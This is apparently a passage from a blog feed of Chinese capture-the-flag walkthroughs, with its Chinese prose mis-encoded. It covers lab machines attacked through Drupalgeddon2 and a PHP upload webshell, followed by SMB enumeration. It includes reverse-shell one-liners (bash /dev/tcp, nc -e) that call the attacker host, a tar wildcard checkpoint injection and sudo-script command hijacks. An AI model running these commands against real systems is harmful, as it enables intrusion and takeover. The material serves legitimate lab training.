2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:33:d8:8f brd ff:ff:ff:ff:ff:ff
    inet 192.168.56.118/24 brd 192.168.56.255 scope global dynamic enp0s3
       valid_lft 590sec preferred_lft 590sec
    inet6 fe80::a00:27ff:fe33:d88f/64 scope link 
       valid_lft forever preferred_lft forever
3: docker0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:58:d5:83:85 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
    inet6 fe80::42:58ff:fed5:8385/64 scope link 
       valid_lft forever preferred_lft forever
5: veth4a6f795@if4: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master docker0 state UP group default 
    link/ether 4a:10:44:5c:bf:f6 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet6 fe80::4810:44ff:fe5c:bff6/64 scope link 
       valid_lft forever preferred_lft forever
```

é¶æœºä¸­è£…äº† Dockerï¼Œä½†æˆ‘ä»¬æ²¡æœ‰æƒé™ï¼Œå¹¶ä¸”åœ¨æœ¬åœ°å¼€äº†ä¸€ä¸ªæœåŠ¡åœ¨ `38225` ç«¯å£ï¼Œå°†å…¶è½¬å‘å‡ºæ¥åæ²¡å‘ç°ä»€ä¹ˆ

æšä¸¾ä¸€ä¸‹æ˜¯å¦å­˜åœ¨å…¶ä»–å®¹å™¨ï¼Œå‘ç° `172.17.0.2`

```bash
Sophia@TheHackersLabs-PaQueAigaLujo:/$ ping 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.124 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.049 ms
^C
--- 172.17.0.2 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1028ms
rtt min/avg/max/mdev = 0.049/0.086/0.124/0.037 ms
```

### ä»£ç†æ­å»º

è¿™é‡Œä½¿ç”¨ stowaway è¿›è¡Œéš§é“æ­å»ºï¼Œæ–¹ä¾¿åç»­æ“ä½œ

```bash
// Kali
./linux_x64_admin -l 8000 -s 123
// Machine
./linux_x64_agent -c 192.168.56.5:8000 -s 123 &
```

![image.png](/post-images/TheHackersLabsPa%20Que%20Aiga%20Lujo/image3.png)

ç„¶åè®¾ç½® proxy ä»£ç†ï¼Œä¹‹åå¯ä»¥é€šè¿‡ä»£ç†æ¥è®¿é—®å®¹å™¨

```bash
(admin) >> use 0

(node 0) >> socks 2131
[*] Trying to listen on 0.0.0.0:2131......
[*] Waiting for agent's response......
[*] Socks start successfully!
```

### Drupal åˆ©ç”¨

å®¹å™¨è¿è¡Œç€ `Drupal`

![image.png](/post-images/TheHackersLabsPa%20Que%20Aiga%20Lujo/image4.png)

`whatweb` ï¼Œç«™ç‚¹æ˜¯ `Drupal8`

```bash
âœ  PaQueAigaLujo proxychains whatweb 172.17.0.2
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:2131  ...  172.17.0.2:80  ...  OK
http://172.17.0.2 [200 OK] Apache[2.4.25], Content-Language[en], Country[RESERVED][ZZ], Drupal, HTML5, HTTPServer[Debian Linux][Apache/2.4.25 (Debian)], IP[172.17.0.2], MetaGenerator[Drupal 8 (https://www.drupal.org)], PHP[7.2.3], PoweredBy[-block], Script, Title[Welcome to Find your own Style | Find your own Style], UncommonHeaders[x-drupal-dynamic-cache,x-content-type-options,x-generator,x-drupal-cache], X-Frame-Options[SAMEORIGIN], X-Powered-By[PHP/7.2.3], X-UA-Compatible[IE=edge]
```

ç½‘ä¸Šæœç´¢ `Drupal8` å­˜åœ¨ RCE æ¼æ´ï¼š**`CVE-2018-7600`**

![image.png](/post-images/TheHackersLabsPa%20Que%20Aiga%20Lujo/image5.png)

![image.png](/post-images/TheHackersLabsPa%20Que%20Aiga%20Lujo/image6.png)

å­˜åœ¨è¯¥æ¼æ´

é€šè¿‡ MSF è¿›è¡Œåˆ©ç”¨

```bash
âœ  PaQueAigaLujo proxychains -q msfconsole  

msf6 > search 2018-7600

Matching Modules
================

   #   Name                                      Disclosure Date  Rank       Check  Description
   -   ----                                      ---------------  ----       -----  -----------
   0   exploit/unix/webapp/drupal_drupalgeddon2  2018-03-28       excellent  Yes    Drupal Drupalgeddon 2 Forms API Property Injection
   1     \_ target: Automatic (PHP In-Memory)    .                .          .      .
   2     \_ target: Automatic (PHP Dropper)      .                .          .      .
   3     \_ target: Automatic (Unix In-Memory)   .                .          .      .
   4     \_ target: Automatic (Linux Dropper)    .                .          .      .
   5     \_ target: Drupal 7.x (PHP In-Memory)   .                .          .      .
   6     \_ target: Drupal 7.x (PHP Dropper)     .                .          .      .
   7     \_ target: Drupal 7.x (Unix In-Memory)  .                .          .      .
   8     \_ target: Drupal 7.x (Linux Dropper)   .                .          .      .
   9     \_ target: Drupal 8.x (PHP In-Memory)   .                .          .      .
   10    \_ target: Drupal 8.x (PHP Dropper)     .                .          .      .
   11    \_ target: Drupal 8.x (Unix In-Memory)  .                .          .      .
   12    \_ target: Drupal 8.x (Linux Dropper)   .                .          .      .
   13    \_ AKA: SA-CORE-2018-002                .                .          .      .
   14    \_ AKA: Drupalgeddon 2                  .                .          .      .
   
msf6 > use 0
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp

msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set payload php/reverse_php 
payload => php/reverse_php

msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set lhost 192.168.56.5
lhost => 192.168.56.5

msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set rhosts 172.17.0.2
rhosts => 172.17.0.2
```

æˆåŠŸæ‹¿åˆ° `shell`

![image.png](/post-images/TheHackersLabsPa%20Que%20Aiga%20Lujo/image7.png)

### è·å¾—äº¤äº’å¼ shell

å­˜åœ¨ç”¨æˆ· `ballenita`

```bash
ls /home
ballenita
```

æŸ¥çœ‹æ•°æ®åº“é…ç½®æ–‡ä»¶

```bash
cat /var/www/html/sites/default/settings.php
```

![image.png](/post-images/TheHackersLabsPa%20Que%20Aiga%20Lujo/image8.png)

ç°åœ¨æ— æ³•è¿›è¡Œç”¨æˆ·åˆ‡æ¢ï¼Œä»¥ä¸ºç°åœ¨å¹¶ä¸æ˜¯äº¤äº’ `shell`ï¼Œè¿™ä¸ªä¼šè¯ä¹Ÿæ— æ³•è·å¾—äº¤äº’ `shell`ï¼Œè¦æƒ³ä¸ªåŠæ³•è·å¾—äº¤äº’çš„ `shell`

é€šè¿‡ `stowaway` è®¾ç½®ç«¯å£è½¬å‘

![image.png](/post-images/TheHackersLabsPa%20Que%20Aiga%20Lujo/image9.png)

ç„¶ååœ¨ä¼šè¯ä¸­è¿›è¡Œåå¼¹ `shell`

```bash
/bin/bash -c 'bash -i >& /dev/tcp/172.17.0.1/6666 0>&1'
```

`Kali` æˆåŠŸæ¥æ”¶åˆ° `Shell` ï¼Œè¯¥ä¼šè¯å¯ä»¥è·å¾—äº¤äº’å¼ `shell` ï¼šhttps://www.sunsetaction.top/2025/04/21/%E5%8F%8D%E5%BC%B9%20shell%20%E5%8D%87%E7%BA%A7/

![image.png](/post-images/TheHackersLabsPa%20Que%20Aiga%20Lujo/image10.png)

æˆåŠŸåˆ‡æ¢åˆ°ç”¨æˆ· `ballenita`

![image.png](/post-images/TheHackersLabsPa%20Que%20Aiga%20Lujo/image11.png)

### ä¿¡æ¯æ”¶é›† - 2

æŸ¥çœ‹ sudo æƒé™ï¼Œå¯ä»¥è¯»å–ä»»ä½•æ–‡ä»¶

```bash
ballenita@76f1a1515e36:/var/www/html$ sudo -l
Matching Defaults entries for ballenita on 76f1a1515e36:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User ballenita may run the following commands on 76f1a1515e36:
    (root) NOPASSWD: /bin/ls, /bin/grep
```

`root` ç›®å½•ä¸‹æœ‰å¯ç–‘çš„æ–‡ä»¶ï¼Œæ–‡ä»¶å†…å®¹æ˜¯ `ElcipotedeChocolate-CipotitoCipoton`

![image.png](/post-images/TheHackersLabsPa%20Que%20Aiga%20Lujo/image12.png)

ç»è¿‡æµ‹è¯•ï¼Œæ˜¯ç”¨æˆ· `cipote` çš„å¯†ç 

![image.png](/post-images/TheHackersLabsPa%20Que%20Aiga%20Lujo/image13.png)

è¯»å– user.txt

```bash
cipote@TheHackersLabs-PaQueAigaLujo:~$ cat user.txt 
f3xxxxxxxxxxxxxxxxxxxxxxxxxxe8  -
```

## ææƒ - root

æŸ¥çœ‹ sudo æƒé™

```bash
cipote@TheHackersLabs-PaQueAigaLujo:~$ sudo -l
Matching Defaults entries for cipote on TheHackersLabs-PaQueAigaLujo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User cipote may run the following commands on TheHackersLabs-PaQueAigaLujo:
    (ALL) NOPASSWD: /usr/bin/mount
```

ç»“æŸ

![image.png](/post-images/TheHackersLabsPa%20Que%20Aiga%20Lujo/image14.png)

è¯»å– root.txt

```bash
# cat /root/root.txt
9xxxxxxxxxxxxxxxxxxxxxx  -
```

## æ€»ç»“

æœ‰æ„æ€]]></content:encoded>
            <category>é¶æœº</category>
            <category>TheHackersLabs</category>
            <category>Linux</category>
            <category>mount</category>
            <category>Drupal</category>
            <category>Tunnel</category>
        </item>
        <item>
            <title><![CDATA[HackMyVM - Silentdev]]></title>
            <link>https://www.sunsetaction.top/2025/09/26/HackMyVMSilentdev</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/09/26/HackMyVMSilentdev</guid>
            <pubDate>Fri, 26 Sep 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[Silentdev. https://hackmyvm.eu/machines/machine.php?vm=Silentdev Recon PortScan FileUpload ç›´æ¥å°±æ˜¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ ä¸Šä¼ ä¸€ä¸ªæ™®é€šå›¾ç‰‡åï¼Œä¼šç»™å‡ºè·¯å¾„ å°è¯•ä¸Šä¼  PHP åç¼€æ–‡ä»¶ï¼Œæ²¡æƒ³åˆ°ç›´æ¥ä¸Šä¼ æˆåŠŸäº† å†™ä¸€å¥è¯æœ¨...]]></description>
            <content:encoded><![CDATA[
# Silentdev.

> https://hackmyvm.eu/machines/machine.php?vm=Silentdev
> 

![image.png](/post-images/HackMyVMSilentdev/image.png)

## Recon

### PortScan

```bash
âœ  Slientdev nmap -sT -min-rate 10000 -p- 192.168.56.117
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-26 15:42 CST
Nmap scan report for 192.168.56.117
Host is up (0.00055s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:1C:EA:F4 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 16.97 seconds
```

```bash

âœ  Slientdev nmap -sT -A -p 22,80 192.168.56.117        
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-26 15:42 CST
Nmap scan report for 192.168.56.117
Host is up (0.00054s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)
| ssh-hostkey: 
|   256 4a:f7:09:40:45:df:25:cc:a4:f5:85:ac:63:c6:13:3e (ECDSA)
|_  256 58:be:2c:d0:40:af:d5:9c:2a:13:38:82:61:f6:8c:87 (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: Upload Image
MAC Address: 08:00:27:1C:EA:F4 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.54 ms 192.168.56.117

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.16 seconds
```

## FileUpload

ç›´æ¥å°±æ˜¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ åŠŸèƒ½

![image.png](/post-images/HackMyVMSilentdev/image1.png)

ä¸Šä¼ ä¸€ä¸ªæ™®é€šå›¾ç‰‡åï¼Œä¼šç»™å‡ºè·¯å¾„

![image.png](/post-images/HackMyVMSilentdev/image2.png)

å°è¯•ä¸Šä¼  PHP åç¼€æ–‡ä»¶ï¼Œæ²¡æƒ³åˆ°ç›´æ¥ä¸Šä¼ æˆåŠŸäº†

![image.png](/post-images/HackMyVMSilentdev/image3.png)

![image.png](/post-images/HackMyVMSilentdev/image4.png)

å†™ä¸€å¥è¯æœ¨é©¬ï¼Œé€šè¿‡èšå‰‘è¿æ¥

![image.png](/post-images/HackMyVMSilentdev/image5.png)

å¼¹ `shell`

```bash
nc 192.168.56.5 1234 -e /bin/bash
```

![image.png](/post-images/HackMyVMSilentdev/image6.png)

## æƒé™æå‡

### ä¿¡æ¯æ”¶é›†

æˆ‘ä»¬èƒ½å‘ç° `www-data` ç”¨æˆ·æ‹¥æœ‰ `developers` ç»„æƒé™

```bash
www-data@silentdev:/var/www/html/uploads$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data),1004(developers)
```

![image.png](/post-images/HackMyVMSilentdev/image7.png)

æŸ¥è¯¢å±äºè¯¥ç»„çš„æ–‡ä»¶

```bash
www-data@silentdev:/home$ find / -group developers 2>/dev/null
/opt/project
/var/backups
```

`/opt/project`

```bash
www-data@silentdev:/opt/project$ ls -al
total 12      
drwxrwx--- 2 developer developers 4096 Apr 19 19:30 .
drwxr-xr-x 3 root      root       4096 Apr 19 11:08 ..
-rw-r--r-- 1 root      root       2030 Apr 19 19:29 index.html

www-data@silentdev:/opt/project$ ls
index.html

www-data@silentdev:/opt/project$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

![image.png](/post-images/HackMyVMSilentdev/image8.png)

`/var/backups`

```bash
www-data@silentdev:/var/backups$ ls
apt.extended_states.0  project.tgz
```

è§£å‹å‡ºæ¥çš„æ˜¯å’Œ project ä¸­ä¸€æ¨¡ä¸€æ ·çš„ `index` æ–‡ä»¶

ä¸è¿‡èƒ½çœ‹å‡ºæ¥ç³»ç»Ÿä¸Šæœ‰ä¸€ä¸ªå®šæ—¶ä»»åŠ¡ï¼ˆCron Jobï¼‰ï¼Œå®ƒä¼šå®šæœŸå°† `/opt/project` ç›®å½•çš„å†…å®¹æ‰“åŒ…å‹ç¼©æˆ `project.tgz` æ–‡ä»¶ï¼Œå¹¶å­˜æ”¾åˆ° `/var/backups` ç›®å½•ä¸­

ä¸Šä¼  `pspy` çœ‹ä¸€ä¸‹ï¼Œæœç„¶ `1002` ç”¨æˆ·å®šæ—¶ä¼šå‹ç¼© `/opt/project`

![image.png](/post-images/HackMyVMSilentdev/image9.png)

### tar åˆ©ç”¨

`*` ä¸‡æ¶ä¹‹æº

```bash
/bin/sh -c cd /opt/project && tar -zcf /var/backups/project.tgz *
```

hijackï¼šhttps://gtfobins.github.io/gtfobins/tar/

```bash
cd /opt/project
echo 'nc 192.168.56.5 1235 -e /bin/sh' > shell.sh
chmod +x shell.sh
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"
```

ç­‰å¾…å¼¹ shell å³å¯ï¼Œå³å¯æ‹¿åˆ° `developers` ç”¨æˆ·

![image.png](/post-images/HackMyVMSilentdev/image10.png)

### å‘½ä»¤åŠ«æŒ

æŸ¥çœ‹ sudo æƒé™

```bash
developer@silentdev:~$ sudo -l
Matching Defaults entries for developer on silentdev:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User developer may run the following commands on silentdev:
    (alfonso) NOPASSWD: /usr/bin/sysinfo.sh
```

```bash
developer@silentdev:~$ cat /usr/bin/sysinfo.sh 
#!/bin/bash

echo "Hello $USER, checking system status."

echo "Choose an option:"
echo "1. Disk usage (df)"
echo "2. Running processes (ps)"
echo "3. Exit"

read -p "Enter option (1-3): " opt

case "$opt" in
        1) action="df" ;;
        2) action="ps" ;;
        3) echo "Goodbye!"; exit ;;
        *) action="echo Invalid option" ;;
esac

read -p "Any additional options?: " extra

eval "$action $extra"
```

æˆ‘ TM ç›´æ¥åŠ«æŒ

![image.png](/post-images/HackMyVMSilentdev/image11.png)

![image.png](/post-images/HackMyVMSilentdev/image12.png)

è¯»å– `user.txt`

```bash
alfonso@silentdev:~$ cat user.txt 
flag{A89aHFj3830878y3hFJ3h2oH}
```

### xxxx

æŸ¥çœ‹ sudo æƒé™

```bash
alfonso@silentdev:~$ sudo -l
Matching Defaults entries for alfonso on silentdev:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User alfonso may run the following commands on silentdev:
    (ALL) NOPASSWD: /usr/bin/silentgets
```

```bash
alfonso@silentdev:~$ /usr/bin/silentgets 
Enter the username: root
root:x:0:0:root:/root:/bin/bash
```

æ‹‰å‡ºæ¥æ£€æŸ¥ä¸€ä¸‹

![image.png](/post-images/HackMyVMSilentdev/image13.png)

åªèƒ½è¯´åˆæ˜¯å‘½ä»¤åŠ«æŒ

![image.png](/post-images/HackMyVMSilentdev/image14.png)

è¯»å– `root.txt`

```bash
root@silentdev:/home/alfonso# cat /root/root.txt 
flag{p7609TNt6a0bGF8HW78BG7eh}
```

## æ€»ç»“

ä¸å¦‚ç¾¤å‹ low]]></content:encoded>
            <category>é¶æœº</category>
            <category>HMV</category>
            <category>Linux</category>
            <category>Hijack</category>
            <category>FileUpload</category>
        </item>
        <item>
            <title><![CDATA[TheHackersLabs - Folclore]]></title>
            <link>https://www.sunsetaction.top/2025/09/24/TheHackersLabsFolclore</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/09/24/TheHackersLabsFolclore</guid>
            <pubDate>Wed, 24 Sep 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[Folclore https://labs.TheHackersLabs.com/machine/123 Recon PortScan ä»…ä»…ä¸¤ä¸ªç«¯å£ SMB æšä¸¾ SMB åŒ¿åæšä¸¾ ä½†æ˜¯å¹¶ä¸èƒ½ä¸‹è½½ä»»ä½•ä¸œè¥¿ ä½†å¯ä»¥æ³¨æ„åˆ°æè¿°ä¸­æœ‰ä¸œè¥¿ ADMIN$ è¿œç¨‹ç®¡ç†å‘˜ C$ é»˜è®¤èµ„æº äº¡çµèŠ‚ æœ€ç»ˆï¼Œæˆ‘ä»¬éƒ½ä¼šåŒ–ä¸º...]]></description>
            <content:encoded><![CDATA[
# Folclore

> https://labs.TheHackersLabs.com/machine/123
> 

![image.png](/post-images/TheHackersLabsFolclore/image.png)

## Recon

### PortScan

```bash
âœ  Folclore nmap -sn 192.168.56.0/24
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-05 16:14 CST
Nmap scan report for 192.168.56.1
Host is up (0.00045s latency).
MAC Address: 0A:00:27:00:00:08 (Unknown)
Nmap scan report for 192.168.56.2
Host is up (0.00025s latency).
MAC Address: 08:00:27:45:5E:64 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.101
Host is up (0.00037s latency).
MAC Address: 08:00:27:EE:0F:0E (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
```

ä»…ä»…ä¸¤ä¸ªç«¯å£

```bash
âœ  Folclore nmap -sT -min-rate 10000 -p- 192.168.56.101
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-05 16:15 CST
Nmap scan report for 192.168.56.101
Host is up (0.0013s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
MAC Address: 08:00:27:EE:0F:0E (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 26.54 seconds
```

```bash
âœ  Folclore nmap -sT -A -p 139,445 192.168.56.101
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-05 16:17 CST
Nmap scan report for 192.168.56.101
Host is up (0.00045s latency).

PORT    STATE SERVICE       VERSION
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
MAC Address: 08:00:27:EE:0F:0E (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Microsoft Windows 11
OS CPE: cpe:/o:microsoft:windows_11
OS details: Microsoft Windows 11
Network Distance: 1 hop
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-08-05T08:17:48
|_  start_date: N/A
|_nbstat: NetBIOS name: FOLCLORE, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:ee:0f:0e (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
|_clock-skew: -1s

TRACEROUTE
HOP RTT     ADDRESS
1   0.45 ms 192.168.56.101

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 64.03 seconds
```

### SMB æšä¸¾

`SMB` åŒ¿åæšä¸¾

```bash
âœ  Folclore nxc smb 192.168.56.101 -u anonymous -p '' --shares
SMB         192.168.56.101  445    FOLCLORE         [*] Windows 10 / Server 2019 Build 19041 (name:FOLCLORE) (domain:Folclore) (signing:False) (SMBv1:False)
SMB         192.168.56.101  445    FOLCLORE         [+] Folclore\anonymous: (Guest)
SMB         192.168.56.101  445    FOLCLORE         [*] Enumerated shares
SMB         192.168.56.101  445    FOLCLORE         Share           Permissions     Remark
SMB         192.168.56.101  445    FOLCLORE         -----           -----------     ------
SMB         192.168.56.101  445    FOLCLORE         ADMIN$                          Admin remota
SMB         192.168.56.101  445    FOLCLORE         C$                              Recurso predeterminado
SMB         192.168.56.101  445    FOLCLORE         Dia de Muertos                  Al final, todos somos polvo y hueso.
SMB         192.168.56.101  445    FOLCLORE         IPC$            READ            IPC remota
SMB         192.168.56.101  445    FOLCLORE         Libertad                        El secreto estÃ¡ en quien se atreve a buscarlo; sigue tu camino sin miedo.
SMB         192.168.56.101  445    FOLCLORE         Lluvia                          Presta atenciÃ³n, pues en esta imagen el camino se revela sÃ³lo a quien sabe escuchar el trueno
SMB         192.168.56.101  445    FOLCLORE         Oro                             Â¿Buscas llegar a QuetzalcÃ³atl? AquÃ­ inicia tu camino.
SMB         192.168.56.101  445    FOLCLORE         Santuario                       El Refugio de Ixchel
SMB         192.168.56.101  445    FOLCLORE         Viento                          El viento sagrado ejecutarÃ¡ la tarea a su debido tiempo
```

ä½†æ˜¯å¹¶ä¸èƒ½ä¸‹è½½ä»»ä½•ä¸œè¥¿

```bash
âœ  Folclore nxc smb 192.168.56.101 -u anonymous -p '' -M spider_plus -o DOWNLOAD_FLAG=true
SMB         192.168.56.101  445    FOLCLORE         [*] Windows 10 / Server 2019 Build 19041 (name:FOLCLORE) (domain:Folclore) (signing:False) (SMBv1:False) 
SMB         192.168.56.101  445    FOLCLORE         [+] Folclore\anonymous: (Guest)
SPIDER_PLUS 192.168.56.101  445    FOLCLORE         [*] Started module spidering_plus with the following options:
SPIDER_PLUS 192.168.56.101  445    FOLCLORE         [*]  DOWNLOAD_FLAG: True
SPIDER_PLUS 192.168.56.101  445    FOLCLORE         [*]     STATS_FLAG: True
SPIDER_PLUS 192.168.56.101  445    FOLCLORE         [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_PLUS 192.168.56.101  445    FOLCLORE         [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_PLUS 192.168.56.101  445    FOLCLORE         [*]  MAX_FILE_SIZE: 50 KB
SPIDER_PLUS 192.168.56.101  445    FOLCLORE         [*]  OUTPUT_FOLDER: /root/.nxc/modules/nxc_spider_plus
SMB         192.168.56.101  445    FOLCLORE         [*] Enumerated shares
SMB         192.168.56.101  445    FOLCLORE         Share           Permissions     Remark
SMB         192.168.56.101  445    FOLCLORE         -----           -----------     ------
SMB         192.168.56.101  445    FOLCLORE         ADMIN$                          Admin remota
SMB         192.168.56.101  445    FOLCLORE         C$                              Recurso predeterminado
SMB         192.168.56.101  445    FOLCLORE         Dia de Muertos                  Al final, todos somos polvo y hueso.
SMB         192.168.56.101  445    FOLCLORE         IPC$            READ            IPC remota
SMB         192.168.56.101  445    FOLCLORE         Libertad                        El secreto estÃ¡ en quien se atreve a buscarlo; sigue tu camino sin miedo.
SMB         192.168.56.101  445    FOLCLORE         Lluvia                          Presta atenciÃ³n, pues en esta imagen el camino se revela sÃ³lo a quien sabe escuchar el trueno
SMB         192.168.56.101  445    FOLCLORE         Oro                             Â¿Buscas llegar a QuetzalcÃ³atl? AquÃ­ inicia tu camino.
SMB         192.168.56.101  445    FOLCLORE         Santuario                       El Refugio de Ixchel
SMB         192.168.56.101  445    FOLCLORE         Viento                          El viento sagrado ejecutarÃ¡ la tarea a su debido tiempo
SPIDER_PLUS 192.168.56.101  445    FOLCLORE         [+] Saved share-file metadata to "/root/.nxc/modules/nxc_spider_plus/192.168.56.101.json".
SPIDER_PLUS 192.168.56.101  445    FOLCLORE         [*] SMB Shares:           9 (ADMIN$, C$, Dia de Muertos, IPC$, Libertad, Lluvia, Oro, Santuario, Viento)
SPIDER_PLUS 192.168.56.101  445    FOLCLORE         [*] SMB Readable Shares:  1 (IPC$)
SPIDER_PLUS 192.168.56.101  445    FOLCLORE         [*] SMB Filtered Shares:  1
SPIDER_PLUS 192.168.56.101  445    FOLCLORE         [*] Total folders found:  0
SPIDER_PLUS 192.168.56.101  445    FOLCLORE         [*] Total files found:    0
```

ä½†å¯ä»¥æ³¨æ„åˆ°æè¿°ä¸­æœ‰ä¸œè¥¿

```bash
ADMIN$                          Admin remota
C$                              Recurso predeterminado
Dia de Muertos                  Al final, todos somos polvo y hueso.
IPC$            READ            IPC remota
Libertad                        El secreto estÃ¡ en quien se atreve a buscarlo; sigue tu camino sin miedo.
Lluvia                          Presta atenciÃ³n, pues en esta imagen el camino se revela sÃ³lo a quien sabe escuchar el trueno
Oro                             Â¿Buscas llegar a QuetzalcÃ³atl? AquÃ­ inicia tu camino.
Santuario                       El Refugio de Ixchel
Viento                          El viento sagrado ejecutarÃ¡ la tarea a su debido tiempo
```

> ADMIN$ - è¿œç¨‹ç®¡ç†å‘˜
C$ - é»˜è®¤èµ„æº
äº¡çµèŠ‚ - æœ€ç»ˆï¼Œæˆ‘ä»¬éƒ½ä¼šåŒ–ä¸ºå°˜åœŸå’Œç™½éª¨ã€‚
IPC$ - è¯»å–è¿œç¨‹IPC
è‡ªç”± - ç§˜å¯†åœ¨äºé‚£äº›æ•¢äºè¿½å¯»çš„äººï¼›æ— æ‰€ç•æƒ§åœ°è¿½éšä½ çš„é“è·¯ã€‚
é›¨ - è¯·æ³¨æ„ï¼Œåœ¨è¿™å¹…å›¾ä¸­ï¼Œåªæœ‰æ‡‚å¾—è†å¬é›·å£°çš„äººæ‰èƒ½æ‰¾åˆ°é“è·¯ã€‚
é‡‘  - ä½ æƒ³åˆ°è¾¾ç¾½è›‡ç¥å—ï¼Ÿä½ çš„é“è·¯ä»è¿™é‡Œå¼€å§‹ã€‚
åœ£æ‰€ - ä¼Šå…‹åˆ‡å°”çš„é¿éš¾æ‰€
é£ - ç¥åœ£çš„é£ä¼šåœ¨é€‚å½“çš„æ—¶å€™å®Œæˆä»»åŠ¡ã€‚
> 

### ç”¨æˆ·æšä¸¾

ç”¨æˆ·æšä¸¾ï¼ŒPSï¼šä¹‹å‰ä¸€ç›´å¡åœ¨ä¸Šè¾¹ï¼Œå› ä¸ºæ²¡æƒ³åˆ°è¦é€šè¿‡æš´åŠ›ç ´è§£ï¼Œå› ä¸ºæˆ‘è§‰å¾—ä¼šæœ‰å¯†ç æœ€å¤§é˜ˆå€¼ï¼ˆ

```bash
âœ  Folclore nxc smb 192.168.56.101 -u guest -p '' --rid-brute                      
SMB         192.168.56.101  445    FOLCLORE         [*] Windows 10 / Server 2019 Build 19041 (name:FOLCLORE) (domain:Folclore) (signing:False) (SMBv1:False) 
SMB         192.168.56.101  445    FOLCLORE         [+] Folclore\guest: (Guest)
SMB         192.168.56.101  445    FOLCLORE         500: FOLCLORE\Administrador (SidTypeUser)
SMB         192.168.56.101  445    FOLCLORE         501: FOLCLORE\Invitado (SidTypeUser)
SMB         192.168.56.101  445    FOLCLORE         503: FOLCLORE\DefaultAccount (SidTypeUser)
SMB         192.168.56.101  445    FOLCLORE         504: FOLCLORE\WDAGUtilityAccount (SidTypeUser)
